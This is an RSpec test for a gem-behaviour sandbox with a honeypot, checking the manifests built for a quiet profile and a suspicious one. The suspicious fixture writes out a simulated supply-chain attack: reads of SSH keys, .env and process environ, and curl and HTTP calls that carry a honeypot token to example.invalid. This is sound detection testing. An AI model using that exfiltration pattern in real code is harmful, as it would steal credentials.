# frozen_string_literal: true

require "bonebed/manifest_builder"
require "bonebed/honeypot"
require "bonebed/policy"
require "json_schemer"

RSpec.describe "complete normalized manifest contracts" do
  def fixture_path(name)
    File.expand_path("fixtures/manifest-golden/#{name}", __dir__)
  end

  def timestamp
    "2026-01-02T03:04:05Z"
  end

  def normalizer
    Bonebed::PathNormalizer.new(home: "/fixture/home", cwd: "/fixture/project",
      tmpdir: "/fixture/tmp", gem_paths: ["/fixture/gems"])
  end

  def startup
    Bonebed::Collector.new.tap do |collector|
      2.times { collector.record_open(mode: :read, path: "/fixture/runtime/boot.rb") }
      collector.record_open(mode: :read, path: "/etc/hosts")
      collector.record_network(family: "inet", addr: "192.0.2.53", port: 53)
      collector.record_exec(path: "/usr/bin/ruby", argv: ["ruby", "-e", ""], parent: nil)
      collector.record_thread(syscall: "clone")
      6.times { collector.record_notification }
    end
  end

  def record_suspicious(collector, token)
    ["/etc/resolv.conf", "/etc/resolv.conf", "/fixture/home/.ssh/id_ed25519", "/fixture/project/.env",
      "/proc/7001/status", "/proc/7001/task/7003/status"].each { |path| collector.record_open(mode: :read, path:) }
    ["/fixture/project/out", "/fixture/project/out", "/fixture/home/.cache/gem/specs/cache"].each do |path|
      collector.record_open(mode: :write, path:)
    end
    [{operation: :create, path: "/fixture/project/new"}, {operation: :truncate, path: "/fixture/project/out", length: 0},
      {operation: :append, path: "/fixture/project/log"}, {operation: :rw, path: "/fixture/project/state"},
      {operation: :mkdir, path: "/fixture/project/generated"}, {operation: :delete, path: "/fixture/project/old"},
      {operation: :rename, from: "/fixture/project/source", to: "/fixture/project/destination"},
      {operation: :chmod, path: "/fixture/project/out", mode: 0o600},
      {operation: :chown, path: "/fixture/project/out", uid: 1000, gid: 1000},
      {operation: :link, from: "../../shared", to: "/fixture/project/link", symbolic: true}].each do |event|
      collector.record(:changes, event)
    end
    2.times { collector.record_network(family: "inet", addr: "198.51.100.42", port: 443) }
    collector.record_network(family: "inet6", addr: "::1", port: 8080)
    collector.record_network(family: "unix", path: "/fixture/home/control.sock")
    collector.record_network(family: "vsock", cid: 42, port: 1024)
    collector.network_intent = [
      {"protocol" => "http", "method" => "POST", "host" => "example.invalid", "path" => "/token/#{token}",
       "sample" => "POST /token/#{token} HTTP/1.1\r\nHost: example.invalid\r\n\r\n"},
      {"protocol" => "tls", "host" => "tls.example.invalid"}
    ]
    2.times do
      collector.record_exec(path: "/usr/bin/curl", argv: ["curl", "https://example.invalid/#{token}",
        "--output=/fixture/project/out", "/proc/7001/environ"], parent: "/usr/bin/ruby", argv_truncated: true)
      collector.record_thread(syscall: "clone3", flags: 65536)
      collector.record(:dns, {name: "#{token}.example.invalid"})
      collector.record(:suspicious, {syscall: "memfd_create", name: "payload", flags: 1})
    end
    collector.record(:dns, {name: "service.example.invalid"})
    collector.record(:processes, {syscall: "clone3", flags: 0})
    collector.record(:sockets, {family: "inet", type: 3, protocol: 255})
    %w[bind listen].each { |syscall| collector.record(:listen, {family: "inet", addr: "0.0.0.0", port: 8080, syscall:}) }
    collector.record(:suspicious, {syscall: "io_uring_setup", entries: 8})
    collector.record(:anti_analysis, {syscall: "ptrace", request: 0})
    collector.record_process(pid: 7001, ppid: 7000, path: "/usr/bin/ruby", parent: nil)
    collector.record_process(pid: 7002, ppid: 7001, path: "/usr/bin/curl", parent: "/usr/bin/ruby")
    collector.record_error(:native, RuntimeError.new("fixture target failure"))
    collector.record_observer_error(:decoder, ArgumentError.new("short socket data"))
    40.times { collector.record_notification }
  end

  def build_profile(profile)
    suspicious = profile == "suspicious"
    honeypot = Bonebed::Honeypot.new(home: nil, project: nil)
    token = honeypot.env.fetch("GITHUB_TOKEN")
    collector = startup
    collector.record_open(mode: :read, path: "/fixture/gems/gems/golden-1.2.3/lib/golden.rb")
    record_suspicious(collector, token) if suspicious
    collector.cleanup_metadata = {"mode" => "cgroup_v2", "completed" => true,
                                  "limitation" => "same-UID cgroup controls are not a security boundary"}
    status = double(exitstatus: suspicious ? 7 : 0, termsig: nil, success?: !suspicious, signaled?: false)
    collector.finish(Process.clock_gettime(Process::CLOCK_MONOTONIC), status, started_time: timestamp,
      stdout: suspicious ? "token=#{token}\nbinary:\xFF".b : "", stderr: suspicious ? "warning after truncation\n" : "",
      stdout_truncated: suspicious, stderr_truncated: suspicious, isolation: suspicious ? "syscall_fallback" : "none")
    specification = Gem::Specification.new do |spec|
      spec.name = "golden"
      spec.version = "1.2.3"
      spec.required_ruby_version = ">= 3.2"
      spec.files = suspicious ? ["lib/golden.rb", "lib/rubygems_plugin.rb"] : ["lib/golden.rb"]
      spec.extensions = suspicious ? ["ext/golden/extconf.rb"] : []
      spec.executables = suspicious ? ["golden"] : []
      spec.post_install_message = suspicious ? "fixture message #{token}" : nil
    end
    dependencies = suspicious ? %w[zeta alpha].map do |name|
      Gem::Specification.new { |spec|
        spec.name = name
        spec.version = "2.0"
      }
    end : []
    baseline = double(id: "golden-baseline-v1", observation: startup.snapshot(normalizer))
    run = {"id" => "golden-#{profile}", "started_at" => timestamp,
           "mode" => {"offline" => suspicious, "honeypot" => true, "env_profile" => suspicious ? "ci" : "dev",
                      "writes_only" => false, "real_home" => false, "cwd" => nil, "enforce" => nil, "repeat" => 1}}
    data = Bonebed::ManifestBuilder.call("golden", "1.2.3", suspicious ? "install" : "require",
      collector.snapshot(normalizer), baseline, platform: "ruby", require_path: "golden",
      specifications: [specification, *dependencies], package: fixture_path("package.txt"), run:)
    data = honeypot.redact(data)
    data["findings"] = Bonebed::Policy.new.findings(data)
    expect(JSON.generate(data)).not_to include(token)
    data
  end

  # Keep every field. Only these environment-dependent values vary across supported CI runners.
  def normalize_runtime(data)
    data = JSON.parse(JSON.generate(data))
    expect(data.fetch("tool").fetch("version")).to eq(Bonebed::VERSION)
    expect(data.fetch("tool").fetch("seccomp_notify")).to eq(Gem.loaded_specs["seccomp-notify"]&.version&.to_s)
    data["tool"]["version"] = "<bonebed-version>"
    data["tool"]["seccomp_notify"] = "<seccomp-notify-version>"
    {"ruby" => RUBY_VERSION, "arch" => RbConfig::CONFIG.fetch("host_cpu"), "kernel" => `uname -r`.strip}.each do |key, value|
      expect(data.fetch("environment").fetch(key)).to eq(value)
      data["environment"][key] = "<#{key}>"
    end
    expect(data.fetch("stats").fetch("wall_ms")).to be_a(Integer).and be >= 0
    data["stats"]["wall_ms"] = 0
    data
  end

  %w[quiet suspicious].each do |profile|
    it "matches every field of the #{profile} manifest and validates schema v2" do
      schema = JSONSchemer.schema(Pathname.new(File.expand_path("../schema/manifest-v2.json", __dir__)))
      actual = build_profile(profile)
      expect(schema.validate(actual).to_a).to be_empty
      expected = JSON.parse(File.read(fixture_path("#{profile}.json")))
      expect(schema.validate(expected).to_a).to be_empty
      expect(normalize_runtime(actual)).to eq(expected)
    end
  end
end
